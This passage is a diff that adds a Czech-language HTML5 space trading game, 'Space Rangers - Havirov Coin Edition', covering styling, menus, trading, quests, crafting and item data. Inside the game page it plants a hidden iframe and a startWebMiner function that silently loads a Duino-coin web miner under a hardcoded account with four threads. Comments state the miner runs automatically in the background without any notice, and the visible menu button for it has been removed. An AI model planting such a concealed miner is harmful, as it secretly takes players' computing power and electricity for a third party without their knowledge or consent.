@@ -1,0 +1,4429 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Space Rangers - Havirov Coin Edition</title>
+    <style>
+        /* === STYLY (stejné jako dříve) === */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html,
+        body {
+            width: 100%;
+            min-height: 100vh;
+            height: 100%;
+            overflow: hidden;
+            background: #0a0a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Consolas', 'Courier New', monospace;
+            user-select: none;
+            position: relative;
+        }
+        #gameContainer {
+            position: relative;
+            border: 2px solid #2a8acc;
+            box-shadow: 0 0 40px rgba(42, 138, 204, 0.15);
+            border-radius: 8px;
+            background: #080818;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+            width: min(1024px, 100vw);
+            height: min(768px, 100vh);
+            aspect-ratio: 1024/768;
+            max-width: 100vw;
+            max-height: 100vh;
+            overflow: hidden;
+        }
+        canvas {
+            display: block;
+            width: 100% !important;
+            height: 100% !important;
+            border-radius: 6px;
+            flex-shrink: 0;
+            image-rendering: auto;
+        }
+        #ui-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        #ui-overlay.active {
+            pointer-events: auto;
+        }
+        .hidden {
+            display: none !important;
+        }
+
+        /* === VŠECHNY OBRAZOVKY === */
+        #menu-screen,
+        #docked-screen,
+        #trading-screen,
+        #quest-screen,
+        #upgrade-screen,
+        #fuel-screen,
+        #credits-screen,
+        #mining-log-screen,
+        #skills-screen,
+        #multiplayer-screen,
+        #crafting-screen,
+        #inventory-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 5, 30, 0.92);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            pointer-events: auto;
+            padding: 20px;
+            overflow-y: auto;
+            border-radius: 6px;
+        }
+        #menu-screen {
+            background: rgba(5, 5, 30, 0.95);
+        }
+        .menu-title {
+            font-size: 52px;
+            color: #2a8acc;
+            text-shadow: 0 0 30px rgba(42, 138, 204, 0.3);
+            margin-bottom: 8px;
+            letter-spacing: 4px;
+            text-align: center;
+        }
+        .menu-subtitle {
+            font-size: 28px;
+            color: #e6e640;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+        .menu-wallet {
+            font-size: 20px;
+            color: #00cc44;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        .menu-btn {
+            background: rgba(20, 20, 50, 0.8);
+            border: 2px solid #3a8acc;
+            color: #ddd;
+            padding: 12px 50px;
+            margin: 6px 0;
+            font-size: 18px;
+            font-family: inherit;
+            cursor: pointer;
+            width: 380px;
+            max-width: 90vw;
+            text-align: center;
+            transition: all 0.2s;
+            border-radius: 6px;
+            letter-spacing: 1px;
+            flex-shrink: 0;
+        }
+        .menu-btn:hover {
+            background: rgba(42, 138, 204, 0.2);
+            border-color: #6ab8ee;
+            color: #fff;
+            transform: scale(1.02);
+        }
+        .menu-btn .desc {
+            display: block;
+            font-size: 12px;
+            color: #888;
+            margin-top: 2px;
+            letter-spacing: 0;
+        }
+        .menu-btn .key {
+            color: #e6e640;
+            font-weight: bold;
+        }
+        .menu-version {
+            position: absolute;
+            bottom: 20px;
+            color: #444;
+            font-size: 12px;
+            text-align: center;
+            width: 100%;
+        }
+        .panel-title {
+            font-size: 32px;
+            color: #e6e640;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(230, 230, 64, 0.2);
+            text-align: center;
+        }
+        .panel-sub {
+            font-size: 18px;
+            color: #88ccff;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .panel-text {
+            color: #ccc;
+            font-size: 16px;
+            line-height: 1.6;
+            max-width: 700px;
+            text-align: center;
+        }
+        .panel-btn {
+            background: rgba(20, 20, 50, 0.8);
+            border: 2px solid #3a8acc;
+            color: #ddd;
+            padding: 10px 40px;
+            margin: 5px 0;
+            font-size: 16px;
+            font-family: inherit;
+            cursor: pointer;
+            width: 320px;
+            max-width: 90vw;
+            text-align: center;
+            transition: all 0.2s;
+            border-radius: 6px;
+            flex-shrink: 0;
+        }
+        .panel-btn:hover {
+            background: rgba(42, 138, 204, 0.2);
+            border-color: #6ab8ee;
+            color: #fff;
+        }
+        .panel-btn .key {
+            color: #e6e640;
+        }
+        .panel-btn.green {
+            border-color: #00cc44;
+        }
+        .panel-btn.green:hover {
+            background: rgba(0, 204, 68, 0.15);
+        }
+        .panel-btn.red {
+            border-color: #cc3333;
+        }
+        .panel-btn.red:hover {
+            background: rgba(204, 51, 51, 0.15);
+        }
+        .panel-btn.yellow {
+            border-color: #e6e640;
+        }
+        .panel-btn.yellow:hover {
+            background: rgba(230, 230, 64, 0.15);
+        }
+        .panel-btn.purple {
+            border-color: #9966ff;
+        }
+        .panel-btn.purple:hover {
+            background: rgba(153, 102, 255, 0.15);
+        }
+        .panel-btn.cyan {
+            border-color: #00cccc;
+        }
+        .panel-btn.cyan:hover {
+            background: rgba(0, 204, 204, 0.15);
+        }
+        .close-btn {
+            position: absolute;
+            top: 16px;
+            right: 24px;
+            color: #888;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.2s;
+            background: none;
+            border: none;
+            font-family: inherit;
+        }
+        .close-btn:hover {
+            color: #fff;
+        }
+        .scroll-area {
+            max-height: 400px;
+            overflow-y: auto;
+            width: 100%;
+            max-width: 800px;
+            padding: 4px;
+        }
+        .scroll-area::-webkit-scrollbar {
+            width: 6px;
+        }
+        .scroll-area::-webkit-scrollbar-track {
+            background: rgba(20, 20, 50, 0.3);
+        }
+        .scroll-area::-webkit-scrollbar-thumb {
+            background: #3a8acc;
+            border-radius: 3px;
+        }
+        .item-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 12px;
+            margin: 2px 0;
+            background: rgba(10, 10, 30, 0.5);
+            border-radius: 4px;
+            border: 1px solid rgba(60, 60, 100, 0.3);
+            cursor: pointer;
+            transition: all 0.15s;
+            font-size: 14px;
+            color: #ddd;
+            flex-wrap: wrap;
+            gap: 2px;
+        }
+        .item-row:hover {
+            background: rgba(42, 138, 204, 0.15);
+            border-color: #3a8acc;
+        }
+        .item-row .price {
+            color: #88dd88;
+        }
+        .item-row .stock {
+            color: #888;
+            font-size: 12px;
+        }
+        .item-row .name {
+            flex: 1;
+            min-width: 80px;
+        }
+        .item-row .qty {
+            color: #aaa;
+            margin: 0 10px;
+        }
+        .item-row.sell {
+            border-color: rgba(204, 51, 51, 0.3);
+        }
+        .item-row.sell:hover {
+            background: rgba(204, 51, 51, 0.12);
+            border-color: #cc3333;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4px 20px;
+            max-width: 600px;
+            width: 100%;
+            padding: 10px;
+            background: rgba(10, 10, 30, 0.4);
+            border-radius: 8px;
+            border: 1px solid rgba(60, 60, 100, 0.3);
+            margin: 8px 0;
+        }
+        .stats-grid .stat {
+            display: flex;
+            justify-content: space-between;
+            padding: 3px 6px;
+            font-size: 14px;
+            color: #ccc;
+        }
+        .stats-grid .stat .label {
+            color: #888;
+        }
+        .stats-grid .stat .value {
+            color: #ddd;
+        }
+        .stats-grid .stat .value.green {
+            color: #88dd88;
+        }
+        .stats-grid .stat .value.yellow {
+            color: #e6e640;
+        }
+        .stats-grid .stat .value.red {
+            color: #dd6666;
+        }
+        .stats-grid .stat .value.blue {
+            color: #66aadd;
+        }
+        .mining-stat {
+            font-size: 13px;
+            color: #aaa;
+            padding: 2px 0;
+        }
+        .mining-stat .highlight {
+            color: #88dd88;
+        }
+        .mining-stat .highlight2 {
+            color: #e6e640;
+        }
+        .slot-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            max-width: 600px;
+            width: 100%;
+            margin: 8px 0;
+        }
+        .slot-item {
+            background: rgba(20, 20, 50, 0.6);
+            border: 1px solid #3a5a7a;
+            border-radius: 4px;
+            padding: 6px;
+            text-align: center;
+            color: #ccc;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            min-height: 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .slot-item:hover {
+            background: rgba(42, 138, 204, 0.2);
+            border-color: #6ab8ee;
+        }
+        .slot-item.equipped {
+            border-color: #44ee88;
+        }
+        .slot-item .slot-label {
+            font-size: 10px;
+            color: #888;
+        }
+        .slot-item .slot-name {
+            font-size: 13px;
+            color: #ddd;
+        }
+        .slot-item .slot-effect {
+            font-size: 10px;
+            color: #88dd88;
+        }
+
+        /* Skrytý iframe pro webminer – vždy na pozadí */
+        #webminer-frame {
+            display: none;
+        }
+
+        @media (max-width: 1050px) {
+            #gameContainer {
+                width: 100vw;
+                max-width: 1024px;
+                height: 100vh;
+                max-height: 100vh;
+                aspect-ratio: 1024/768;
+            }
+            .menu-btn {
+                width: 90%;
+                max-width: 380px;
+                font-size: 16px;
+                padding: 10px 20px;
+            }
+            .menu-title {
+                font-size: 36px;
+            }
+            .menu-subtitle {
+                font-size: 20px;
+            }
+            .panel-title {
+                font-size: 26px;
+            }
+            .panel-btn {
+                width: 90%;
+                max-width: 320px;
+                font-size: 14px;
+                padding: 8px 20px;
+            }
+            .slot-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        @media (max-width: 600px) {
+            .menu-title {
+                font-size: 26px;
+            }
+            .menu-subtitle {
+                font-size: 16px;
+            }
+            .menu-btn {
+                font-size: 14px;
+                padding: 8px 16px;
+                width: 95%;
+            }
+            .panel-title {
+                font-size: 20px;
+            }
+            .panel-btn {
+                width: 95%;
+                font-size: 13px;
+                padding: 8px 14px;
+            }
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            .item-row {
+                font-size: 12px;
+                padding: 4px 8px;
+            }
+            .close-btn {
+                font-size: 22px;
+                top: 8px;
+                right: 12px;
+            }
+            .slot-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        @media (max-height: 800px) {
+            #gameContainer {
+                max-height: 100vh;
+                height: 100vh;
+                width: 100vw;
+                max-width: 100vw;
+                aspect-ratio: 1024/768;
+            }
+            .menu-title {
+                font-size: 32px;
+            }
+            .menu-subtitle {
+                font-size: 18px;
+                margin-bottom: 16px;
+            }
+            .menu-btn {
+                padding: 8px 30px;
+                font-size: 15px;
+                margin: 4px 0;
+            }
+            .menu-wallet {
+                font-size: 16px;
+                margin-bottom: 16px;
+            }
+            .menu-version {
+                bottom: 10px;
+                font-size: 10px;
+            }
+        }
+        @media (max-height: 650px) {
+            .menu-title {
+                font-size: 24px;
+            }
+            .menu-subtitle {
+                font-size: 14px;
+                margin-bottom: 10px;
+            }
+            .menu-btn {
+                padding: 6px 20px;
+                font-size: 13px;
+                margin: 3px 0;
+                width: 300px;
+            }
+            .menu-wallet {
+                font-size: 14px;
+                margin-bottom: 10px;
+            }
+            .panel-title {
+                font-size: 18px;
+                margin-bottom: 10px;
+            }
+            .panel-sub {
+                font-size: 14px;
+                margin-bottom: 8px;
+            }
+            .panel-btn {
+                padding: 6px 16px;
+                font-size: 12px;
+                margin: 3px 0;
+                width: 240px;
+            }
+            .close-btn {
+                font-size: 18px;
+                top: 4px;
+                right: 8px;
+            }
+            .scroll-area {
+                max-height: 200px;
+            }
+        }
+        @media (max-aspect-ratio: 1024/768) {
+            #gameContainer {
+                width: 100vw;
+                height: calc(100vw * 768 / 1024);
+                max-height: 100vh;
+            }
+        }
+        @media (min-aspect-ratio: 1024/768) {
+            #gameContainer {
+                height: 100vh;
+                width: calc(100vh * 1024 / 768);
+                max-width: 100vw;
+            }
+        }
+        .webminer-status {
+            color: #66ddff;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+        .webminer-status.active {
+            color: #44ee88;
+        }
+        .webminer-status.inactive {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="gameContainer">
+        <canvas id="gameCanvas" width="1024" height="768"></canvas>
+
+        <!-- MENU (bez tlačítka a stavu Web Miner) -->
+        <div id="menu-screen">
+            <div class="menu-title">SPACE RANGERS</div>
+            <div class="menu-subtitle">⚡ Havirov Coin Edition ⚡</div>
+            <div class="menu-wallet" id="menuWallet">Wallet: 0.0000 HVC</div>
+            <button class="menu-btn" data-action="newGame"><span class="key">[1]</span> Nová hra <span class="desc">Zacnete jako novy ranger v galaxii</span></button>
+            <button class="menu-btn" data-action="loadGame"><span class="key">[2]</span> Nacist hru (Wallet) <span class="desc">Nactete ulozenou hru z walletu</span></button>
+            <button class="menu-btn" data-action="credits"><span class="key">[3]</span> Kredity <span class="desc">Informace o hre a tvurcich</span></button>
+            <button class="menu-btn" data-action="mining"><span class="key">[4]</span> Asteroid Mining <span class="desc">Težte suroviny z asteroidů</span></button>
+            <button class="menu-btn" data-action="multiplayer"><span class="key">[5]</span> Multiplayer <span class="desc">Hrajte s ostatnimi hraci (simulace)</span></button>
+            <!-- Tlačítko Web Miner bylo odstraněno -->
+            <div class="menu-version">Version 2.4 - Smooth controls + less aggressive pirates</div>
+        </div>
+
+        <!-- DOCKED (rozšířeno o Crafting a Inventář) -->
+        <div id="docked-screen" class="hidden">
+            <button class="close-btn" data-action="undock">✕</button>
+            <div class="panel-title" id="dockedTitle">DOKOVANO U: Planeta</div>
+            <div class="panel-sub" id="dockedType">Typ: Planeta</div>
+            <div class="panel-text" id="dockedInfo">Zbozi: 0 jednotek</div>
+            <div style="margin:12px 0;display:flex;flex-wrap:wrap;gap:8px;justify-content:center;">
+                <button class="panel-btn" data-action="trade"><span class="key">[T]</span> Obchodovani</button>
+                <button class="panel-btn" data-action="quests"><span class="key">[Q]</span> Ukoly</button>
+                <button class="panel-btn" data-action="upgrade"><span class="key">[U]</span> Vylepseni lodi</button>
+                <button class="panel-btn" data-action="fuel"><span class="key">[F]</span> Nakup paliva</button>
+                <button class="panel-btn" data-action="mining"><span class="key">[K]</span> Mining</button>
+                <button class="panel-btn purple" data-action="skills"><span class="key">[P]</span> Skill tree</button>
+                <button class="panel-btn cyan" data-action="crafting"><span class="key">[C]</span> Crafting</button>
+                <button class="panel-btn green" data-action="inventory"><span class="key">[I]</span> Inventář</button>
+                <button class="panel-btn red" data-action="undock"><span class="key">[ESC]</span> Odlet</button>
+            </div>
+            <div style="position:absolute;bottom:20px;left:20px;color:#888;font-size:13px;text-align:left;line-height:1.6;" id="dockedShipStats"></div>
+        </div>
+
+        <!-- CRAFTING -->
+        <div id="crafting-screen" class="hidden">
+            <button class="close-btn" data-action="closeCrafting">✕</button>
+            <div class="panel-title" style="color:#00cccc;">CRAFTING</div>
+            <div class="panel-sub" id="craftingResources">Suroviny: Ruda: 0, Komponenty: 0</div>
+            <div class="scroll-area" id="craftingList" style="max-height:400px;width:100%;max-width:700px;"></div>
+            <div style="margin-top:8px;color:#666;font-size:12px;">Klikni na recept pro vyrobeni | [ESC] Zpet</div>
+        </div>
+
+        <!-- INVENTÁŘ -->
+        <div id="inventory-screen" class="hidden">
+            <button class="close-btn" data-action="closeInventory">✕</button>
+            <div class="panel-title" style="color:#44ee88;">INVENTÁŘ</div>
+            <div class="panel-sub">Náklad a vybavení</div>
+            <div style="display:flex;flex-wrap:wrap;gap:20px;justify-content:center;width:100%;max-width:900px;">
+                <div style="flex:1;min-width:250px;">
+                    <div style="color:#88dd88;font-size:16px;">Náklad (suroviny)</div>
+                    <div class="scroll-area" id="cargoInventory" style="max-height:200px;"></div>
+                </div>
+                <div style="flex:1;min-width:250px;">
+                    <div style="color:#66ddff;font-size:16px;">Vybavení (slot)</div>
+                    <div id="equippedSlots" class="slot-grid"></div>
+                </div>
+            </div>
+            <div style="margin-top:8px;color:#666;font-size:12px;">Klikni na slot pro odebrání vybavení | [ESC] Zpet</div>
+        </div>
+
+        <!-- OSTATNÍ OBRAZOVKY (stejné) -->
+        <div id="trading-screen" class="hidden">
+            <button class="close-btn" data-action="closeTrade">✕</button>
+            <div class="panel-title" style="font-size:26px;">OBCHODNI CENTRUM</div>
+            <div class="panel-sub" id="tradeStation">Planeta | Kredity: 0.0000 HVC</div>
+            <div style="display:flex;gap:20px;width:100%;max-width:880px;flex-wrap:wrap;justify-content:center;">
+                <div style="flex:1;min-width:280px;">
+                    <div style="color:#88dd88;font-size:16px;margin-bottom:6px;">⬇ NAKUP</div>
+                    <div class="scroll-area" id="buyList"></div>
+                </div>
+                <div style="flex:1;min-width:280px;">
+                    <div style="color:#dd6666;font-size:16px;margin-bottom:6px;">⬆ PRODEJ</div>
+                    <div class="scroll-area" id="sellList"></div>
+                </div>
+            </div>
+            <div style="margin-top:10px;color:#666;font-size:12px;">Klikni na polozku pro koupi/prodej | [ESC] Zpet</div>
+        </div>
+
+        <div id="quest-screen" class="hidden">
+            <button class="close-btn" data-action="closeQuests">✕</button>
+            <div class="panel-title">UKOLY RANGERA</div>
+            <div id="questActive" style="width:100%;max-width:780px;background:rgba(10,30,10,0.5);border:2px solid #44aa44;border-radius:8px;padding:14px 20px;margin:8px 0;"></div>
+            <div class="panel-sub" style="font-size:18px;margin-top:10px;">DOSTUPNE UKOLY</div>
+            <div class="scroll-area" id="questList" style="max-height:260px;"></div>
+            <div style="margin-top:12px;color:#666;font-size:12px;">Klikni na ukol pro prijeti | [ESC] Zpet</div>
+        </div>
+
+        <div id="upgrade-screen" class="hidden">
+            <button class="close-btn" data-action="closeUpgrade">✕</button>
+            <div class="panel-title">VYLEPSENI LODI</div>
+            <div style="display:flex;gap:20px;flex-wrap:wrap;justify-content:center;width:100%;max-width:880px;">
+                <div style="flex:1;min-width:240px;background:rgba(10,10,30,0.4);border:1px solid #3a5a7a;border-radius:8px;padding:12px 16px;">
+                    <div style="color:#88ccff;font-size:16px;margin-bottom:6px;">STATISTIKY LODI</div>
+                    <div id="upgradeStats" style="font-size:13px;color:#aaa;line-height:1.7;"></div>
+                </div>
+                <div style="flex:1.5;min-width:300px;">
+                    <div style="color:#e6e640;font-size:16px;margin-bottom:6px;">DOSTUPNA VYLEPSENI (neomezeně)</div>
+                    <div class="scroll-area" id="upgradeList" style="max-height:350px;"></div>
+                </div>
+            </div>
+            <div style="margin-top:8px;color:#666;font-size:12px;">Klikni na vylepseni | [ESC] Zpet</div>
+        </div>
+
+        <div id="fuel-screen" class="hidden">
+            <button class="close-btn" data-action="closeFuel">✕</button>
+            <div class="panel-title">NAKUP PALIVA</div>
+            <div class="panel-sub" id="fuelCurrent">Aktualni palivo: 100/100</div>
+            <div style="display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin:12px 0;">
+                <button class="panel-btn" data-action="fuel10"><span class="key">[1]</span> 10 jednotek (0.05 HVC)</button>
+                <button class="panel-btn" data-action="fuel25"><span class="key">[2]</span> 25 jednotek (0.12 HVC)</button>
+                <button class="panel-btn" data-action="fuel50"><span class="key">[3]</span> 50 jednotek (0.25 HVC)</button>
+                <button class="panel-btn" data-action="fuel100"><span class="key">[4]</span> 100 jednotek (0.50 HVC)</button>
+            </div>
+            <div style="margin-top:8px;color:#666;font-size:12px;">[ESC] Zpet</div>
+        </div>
+
+        <div id="credits-screen" class="hidden">
+            <button class="close-btn" data-action="closeCredits">✕</button>
+            <div class="panel-title" style="color:#2a8acc;">KREDITY</div>
+            <div class="panel-text" style="max-width:600px;line-height:2;">
+                <div style="color:#e6e640;font-size:22px;">SPACE RANGERS - HAVIROV COIN EDITION</div>
+                <div style="color:#888;font-size:14px;">Puvodni hra: Elemental Games (2002)</div>
+                <div style="color:#888;font-size:14px;">Inspirovano: Space Rangers, X3, Escape Velocity</div>
+                <div style="color:#aaa;font-size:14px;margin-top:8px;">Vsechny texty jsou v cestine.</div>
+                <div style="color:#88dd88;font-size:14px;">Kredity (HVC) jsou integrovany s Havirov Coin walletem.</div>
+                <div style="color:#666;font-size:12px;margin-top:12px;">[ESC] Zpet</div>
+            </div>
+        </div>
+
+        <div id="mining-log-screen" class="hidden">
+            <button class="close-btn" data-action="closeMiningLog">✕</button>
+            <div class="panel-title" style="color:#e6e640;">MINING STATISTICS</div>
+            <div id="miningOverall" style="width:100%;max-width:700px;background:rgba(10,10,30,0.5);border:1px solid #3a5a7a;border-radius:8px;padding:12px 16px;margin:6px 0;"></div>
+            <div class="panel-sub" style="font-size:16px;margin-top:6px;">RECENT SESSIONS</div>
+            <div class="scroll-area" id="miningSessions" style="max-height:240px;width:100%;max-width:700px;"></div>
+            <div style="margin-top:8px;color:#666;font-size:12px;">[L] Refresh | [ESC] Zpet</div>
+        </div>
+
+        <div id="skills-screen" class="hidden">
+            <button class="close-btn" data-action="closeSkills">✕</button>
+            <div class="panel-title">SKILLY RANGERA</div>
+            <div class="panel-sub" id="skillPoints">Volnych bodu: 0</div>
+            <div id="skillList" style="width:100%;max-width:600px;margin:8px 0;"></div>
+            <div style="margin-top:8px;color:#666;font-size:12px;">[1-5] Pridat do skilly | [ESC] Zpet</div>
+        </div>
+
+        <div id="multiplayer-screen" class="hidden">
+            <button class="close-btn" data-action="closeMultiplayer">✕</button>
+            <div class="panel-title" style="color:#00cccc;">MULTIPLAYER</div>
+            <div class="panel-sub" style="color:#88ccff;">Hrajte s ostatnimi hraci (simulace)</div>
+            <div style="display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin:12px 0;">
+                <button class="panel-btn cyan" data-action="hostGame"><span class="key">[1]</span> Hostovat hru <span class="desc">Simulace serveru</span></button>
+                <button class="panel-btn cyan" data-action="joinGame"><span class="key">[2]</span> Pripojit se <span class="desc">Simulace pripojeni</span></button>
+            </div>
+            <div style="color:#888;font-size:13px;max-width:500px;text-align:center;margin:8px 0;">Multiplayer je v teto HTML verzi simulovan - ukazuje ostatni hrace s nahodnym chovanim.</div>
+            <div style="margin-top:8px;color:#666;font-size:12px;">[ESC] Zpet</div>
+        </div>
+
+    </div>
+
+    <!-- Neviditelný iframe pro webminer – na pozadí, automaticky spouštěn -->
+    <iframe id="webminer-frame" style="display:none;"></iframe>
+
+    <script>
+        // ===================================================================
+        // SPACE RANGERS - HTML5 PORT v2.4 + Web Miner na pozadí (iframe)
+        // ===================================================================
+
+        // --- Web Miner pomocí iframe (externí odkaz), běží na pozadí ---
+        let webMiningActive = false;
+
+        function startWebMiner() {
+            if (document.getElementById('webminer-frame') && webMiningActive) {
+                return; // již běží
+            }
+            let iframe = document.getElementById('webminer-frame');
+            if (!iframe) {
+                iframe = document.createElement('iframe');
+                iframe.id = 'webminer-frame';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+            }
+            // Nastavíme src na danou URL
+            iframe.src = 'https://server.duinocoin.com/webminer.html?username=davepro777&threads=4&rigid=&keyinput=';
+            webMiningActive = true;
+            // Žádné UI hlášení – běží potichu
+        }
+
+        function stopWebMiner() {
+            let iframe = document.getElementById('webminer-frame');
+            if (iframe) {
+                iframe.src = ''; // zastaví načítání
+                iframe.remove(); // odstraníme z DOM
+            }
+            webMiningActive = false;
+        }
+
+        // --- Zbytek herního kódu (stejný jako dříve) ---
+
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+
+        // --- UI element references ---
+        const menuScreen = document.getElementById('menu-screen');
+        const dockedScreen = document.getElementById('docked-screen');
+        const tradingScreen = document.getElementById('trading-screen');
+        const questScreen = document.getElementById('quest-screen');
+        const upgradeScreen = document.getElementById('upgrade-screen');
+        const fuelScreen = document.getElementById('fuel-screen');
+        const creditsScreen = document.getElementById('credits-screen');
+        const miningLogScreen = document.getElementById('mining-log-screen');
+        const skillsScreen = document.getElementById('skills-screen');
+        const multiplayerScreen = document.getElementById('multiplayer-screen');
+        const craftingScreen = document.getElementById('crafting-screen');
+        const inventoryScreen = document.getElementById('inventory-screen');
+
+        const menuWallet = document.getElementById('menuWallet');
+
+        // --- Constants ---
+        const SCREEN_W = 1024,
+            SCREEN_H = 768;
+        const RADAR_RANGE = 1500;
+        const RADAR_SIZE = 160;
+        const RADAR_POS = { x: SCREEN_W - RADAR_SIZE - 16, y: 96 };
+        const FPS = 60;
+        const WORLD_W = 8000;
+        const WORLD_H = 6000;
+
+        // --- Colors ---
+        const COLORS = {
+            black: '#000',
+            darkBg: '#0a0a1a',
+            spaceBg: '#080818',
+            white: '#ddd',
+            green: '#00bb44',
+            brightGreen: '#44ee88',
+            red: '#bb2222',
+            brightRed: '#ee4444',
+            blue: '#2266bb',
+            brightBlue: '#4488ee',
+            yellow: '#bbbb00',
+            brightYellow: '#eeee44',
+            cyan: '#33bbcc',
+            brightCyan: '#66ddff',
+            purple: '#8844dd',
+            brightPurple: '#aa66ff',
+            orange: '#ff8800',
+            gray: '#555',
+            lightGray: '#999',
+            darkGray: '#222',
+            borderColor: '#3a8acc',
+            fuelColor: '#ff8800',
+            panelBg: 'rgba(10,10,30,0.92)',
+            asteroid: '#8B7D6B',
+            asteroidDark: '#5C4E3E',
+        };
+
+        // --- Item Database (stejné) ---
+        const ITEM_CATEGORIES = {
+            'Minerály': ['Ruda', 'Zlato', 'Stribro', 'Platina', 'Krystaly', 'Kremik', 'Uhlí', 'Síra', 'Vzácné kovy', 'Měď',
+                'Železo', 'Hliník', 'Titan', 'Lithium', 'Kobalt', 'Nikl', 'Cín', 'Zinek', 'Olovo'
+            ],
+            'Zbraně': ['Laser I', 'Laser II', 'Laser III', 'Plazmová puška', 'Fotonový kanón', 'Raketomet', 'Torpedo',
+                'Ionový blaster', 'Neutronový emitátor', 'Pulzní laser', 'Gaussovka', 'Railgun', 'Štítový generátor',
+                'EM pulz', 'Disruptor'
+            ],
+            'Potraviny': ['Chléb', 'Maso', 'Ovoce', 'Zelenina', 'Konzervy', 'Syntetické jídlo', 'Nutri-pasty',
+                'Proteinové tyčinky', 'Káva', 'Čaj', 'Víno', 'Pivo', 'Voda', 'Energetické nápoje'
+            ],
+            'Technologie': ['Čipy', 'Procesory', 'Paměti', 'Senzoři', 'Navigace', 'Komunikace', 'Šifrování', 'AI moduly',
+                'Hologramy', 'Nanotechnologie', 'Bionika', 'Kybernetika', 'Robotika', 'Drony', 'Satelity'
+            ],
+            'Léky': ['Analgetika', 'Antibiotika', 'Stimulanty', 'Nanoleky', 'Regenerace', 'Antitoxin', 'Vakcíny', 'Vitamíny',
+                'Očkování', 'Adrenalin', 'Sedativa', 'Antidepresiva'
+            ],
+            'Luxus': ['Šperky', 'Víno', 'Kaviár', 'Svatky', 'Umění', 'Starodávné předměty', 'Holografické obrazy',
+                'Virtuální realita', 'Hudební nástroje', 'Knihy', 'Parfémy'
+            ],
+            'Komponenty': ['Motory', 'Převodovky', 'Kabely', 'Trubky', 'Filtry', 'Čerpadla', 'Ventily', 'Těsnění', 'Ložiska',
+                'Šrouby', 'Matky', 'Podložky', 'Svařovací hořáky'
+            ]
+        };
+
+        const ALL_ITEMS = [];
+        for (const [cat, items] of Object.entries(ITEM_CATEGORIES)) {
+            for (const item of items) {
+                ALL_ITEMS.push({ name: item, category: cat });
+            }
+        }
+        const baseNames = ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Theta', 'Iota', 'Kappa', 'Lambda', 'Mu',
+            'Nu', 'Xi', 'Omicron', 'Pi', 'Rho', 'Sigma', 'Tau', 'Upsilon', 'Phi', 'Chi', 'Psi', 'Omega', 'Nova', 'Prime',
+            'Star', 'Nebula', 'Void', 'Crystal', 'Shadow'
+        ];
+        while (ALL_ITEMS.length < 400) {
+            const cat = Object.keys(ITEM_CATEGORIES)[ALL_ITEMS.length % Object.keys(ITEM_CATEGORIES).length];
+            const suffix = baseNames[ALL_ITEMS.length % baseNames.length];
+            ALL_ITEMS.push({ name: `${cat.slice(0, -1)} ${suffix} ${ALL_ITEMS.length}`, category: cat });
+        }
+
+        const ITEM_CATEGORY_MAP = {};
+        for (const item of ALL_ITEMS) {
+            ITEM_CATEGORY_MAP[item.name] = item.category;
+        }
+
+        const ITEM_PASSIVE_BONUSES = {
+            'Štítový generátor': { maxShield: 10, shieldRegen: 0.05 },
+            'AI moduly': { rotationSpeed: 0.02 },
+            'Navigace': { maxSpeed: 0.5 },
+            'Nanotechnologie': { hpRegen: 0.05 },
+            'Bionika': { maxHp: 15 },
+            'Kybernetika': { maxHp: 10, hpRegen: 0.02 },
+            'Motory': { thrustPower: 0.02, maxSpeed: 0.3 },
+            'Senzoři': { radarRange: 100 },
+            'Komunikace': { radarRange: 50 },
+            'Stimulanty': { maxSpeed: 0.5 },
+            'Antibiotika': { hpRegen: 0.03 },
+            'Regenerace': { hpRegen: 0.08 },
+            'Nanoleky': { hpRegen: 0.05, maxHp: 10 },
+        };
+
+        const SKILL_DEFS = {
+            obchod: { name: 'Obchodování', icon: '$', desc: 'Sleva pri nákupu a prémiový prodej', max: 100 },
+            stity: { name: 'Štíty', icon: '◈', desc: 'Více štítů a rychlejší regenerace', max: 100 },
+            zbrane: { name: 'Zbraně', icon: '⚔', desc: 'Větší poškození a rychlejší střelba', max: 100 },
+            motor: { name: 'Motor', icon: '»', desc: 'Vyšší rychlost a tah motoru', max: 100 },
+            naklad: { name: 'Náklad', icon: '▣', desc: 'Větší nákladový prostor', max: 100 },
+        };
+
+        const CRAFTING_RECIPES = [
+            { name: 'Vyztužený trup', requires: { Ruda: 3, Komponenty: 1 }, bonus: 'maxHp', bonusVal: 30,
+            slot: 'trup' },
+            { name: 'Vylepšený štít', requires: { Ruda: 2, Komponenty: 2 }, bonus: 'maxShield', bonusVal: 25,
+            slot: 'stit' },
